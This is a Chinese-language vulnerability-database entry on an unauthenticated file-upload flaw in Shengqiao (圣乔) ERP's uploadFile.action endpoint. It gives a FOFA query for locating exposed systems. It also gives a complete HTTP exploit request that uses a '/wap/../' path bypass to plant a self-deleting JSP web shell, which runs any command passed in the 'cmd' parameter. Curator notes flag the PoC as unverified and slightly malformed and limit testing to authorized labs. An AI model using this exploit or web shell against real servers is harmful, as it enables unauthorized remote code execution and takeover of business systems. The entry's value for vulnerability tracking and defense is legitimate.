---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "圣乔ERP uploadFile路径绕过上传"
product: "圣乔ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；JSP执行目录"
prerequisites: "声明未认证"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%9C%A3%E4%B9%94/%E5%9C%A3%E4%B9%94ERP%E7%B3%BB%E7%BB%9F%20uploadFile.action%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%87%B4RCE%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"圣乔-ERP系统\""
id: "vw-17305b8708e65cb0740b6b02"
entity_id: "ve-17305b8708e65cb0740b6b02"
schema_version: "1"
---

# 圣乔ERP uploadFile路径绕过上传

## 条目说明

- 对象与具体问题：圣乔ERP；uploadFile路径绕过上传
- 版本、配置及部署条件：无版本；JSP执行目录
- 认证与权限前提：声明未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Type multipart/form-data与boundary间缺分号
- /wap/../潜在鉴权绕过依赖请求规范化，需说明
- JSP执行后自删除，结果/落地/触发仅图，不能当无害验证
- 在野已知/范围广无来源，无修复build

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

圣乔ERP系统 uploadFile.action 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## 影响版本

圣乔ERP系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="圣乔-ERP系统"

POC/EXP：

```http
POST /erp/wap/../uploadFile.action HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: multipart/form-data boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip
Connection: close

------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="Filedata"; filename="rce.jsp"
Content-Type: image/png

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```


![image-20241210194756534](./.resource/圣乔ERP系统uploadFile.action文件上传致RCE漏洞/media/image-20241210194756534.png)


![image-20241210194813746](./.resource/圣乔ERP系统uploadFile.action文件上传致RCE漏洞/media/image-20241210194813746.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问控制

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
